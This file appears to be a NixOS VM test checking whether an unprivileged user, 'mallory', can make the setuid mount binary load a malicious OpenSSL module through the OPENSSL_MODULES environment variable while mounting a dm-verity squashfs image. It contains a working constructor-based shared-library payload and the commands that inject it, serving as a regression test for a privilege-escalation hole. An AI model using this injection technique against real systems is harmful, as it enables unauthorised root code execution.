import ./make-test-python.nix (
  { pkgs, ... }:
  {
    name = "boot-stage2";

    nodes.machine =
      {
        config,
        pkgs,
        lib,
        ...
      }:
      {
        config = {
          nixpkgs.overlays = [
            (final: prev: {
              util-linux = prev.util-linux.override {
                cryptsetupSupport = true;
              };
            })
          ];

          environment = {
            systemPackages = with pkgs; [
              util-linux cryptsetup squashfsTools
            ];
          };

          users.users.mallory = {
            isNormalUser = true;
          };
        };
      };


    testScript = let
      writeCWithArgs = pname: directory: args: code:
        pkgs.runCommandCC pname
        {
          inherit pname code;
          executable = true;
          passAsFile = [ "code" ];
          compilerArgs = args;
          # Pointless to do this on a remote machine.
          preferLocalBuild = true;
          allowSubstitutes = false;
          meta = {
            mainProgram = pname;
          };
        }
        ''
          n=$out/${directory}/${pname}
          mkdir -p "$(dirname "$n")"
          mv "$codePath" code.c
          $CC -x c $compilerArgs code.c -o "$n"
        '';

      evilModule = writeCWithArgs "default.so" "lib" [ "-Os" "-fPIC" "-shared" ] ''
        #include <unistd.h>
        #include <stdio.h>
        #include <stdlib.h>

        void __attribute__((constructor)) evil() {
          fprintf(stderr, "Pwned, we're UID %d\n", getuid());
          system("echo \"Now we are: $(${pkgs.coreutils}/bin/id)\" >&2");
          exit(0);
        }
      '';
    in ''
      # Prime kernel modules as root
      machine.succeed("cd && mkdir -p test && dd if=/dev/urandom of=test/random.bin bs=1M count=1 >&2 && mksquashfs test test.squashfs >&2 && rm -rf test")
      machine.succeed("cd && veritysetup format --root-hash-file=test.hash test.squashfs test.verity >&2 && mkdir -p test")
      machine.succeed("cd && mount -t squashfs -o verity.hashdevice=test.verity,verity.roothashfile=test.hash test.squashfs test && mount | tail -n1 >&2 && umount test")

      # Remove all the safety rails
      machine.succeed("chmod 0666 /dev/mapper/control && chown root:users /dev/mapper/control && chown root:users /dev/loop*")

      # Now try it as Mallory
      machine.succeed("sudo -u mallory sh -c 'cd && mkdir -p test && dd if=/dev/urandom of=test/random.bin bs=1M count=1 >&2 && mksquashfs test test.squashfs >&2 && rm -rf test'")
      machine.succeed("sudo -u mallory sh -c 'cd && veritysetup format --root-hash-file=test.hash test.squashfs test.verity >&2 && mkdir -p test'")
      machine.succeed("sudo -u mallory sh -c 'cd && echo \"We are: $(id), and mount is: $(command -v mount)\" >&2 && LIBMOUNT_DEBUG=all OPENSSL_MODULES=${evilModule}/lib mount -v -t squashfs -o verity.hashdevice=test.verity,verity.roothashfile=test.hash test.squashfs test' >&2")
    '';

    meta.maintainers = with pkgs.lib.maintainers; [ numinit ];
  }
)
